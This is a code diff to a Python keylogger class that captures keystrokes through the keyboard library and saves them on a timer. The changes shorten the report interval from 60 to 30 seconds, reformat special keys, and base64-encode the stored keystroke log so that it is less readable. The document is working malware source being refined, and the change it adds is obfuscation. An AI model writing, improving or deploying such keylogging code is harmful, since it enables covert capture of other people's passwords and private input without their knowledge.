@@ -1,11 +1,12 @@
 # use wasabi for mesages
+import base64
 import wasabi
 import keyboard
 from threading import Timer, Thread
 from datetime import datetime
 
 #send report ever x seconds
-REPORT_TIMER = 60
+REPORT_TIMER = 30
 
 
 # intialize wasabi printer
@@ -39,7 +40,7 @@ class keyLogger:
 				name = "."
 			#for other special keys just change to uppercase and place an underscore
 			else:
-				name = name.replace(" ", "_").upper()
+				name = " " + name.replace(" ", "_").upper() + " "
 
 		#add key to log
 		self.log += name
@@ -60,7 +61,7 @@ class keyLogger:
 
 	def log_keystrokes(self):
 		with open(f"{self.filename}.txt", 'w') as f:
-			f.write(self.log)
+			f.write(base64.b64encode(self.log.encode("ascii")).decode("ascii"))
 		msg.good("Log file has been saved!")
 
 	def report(self):
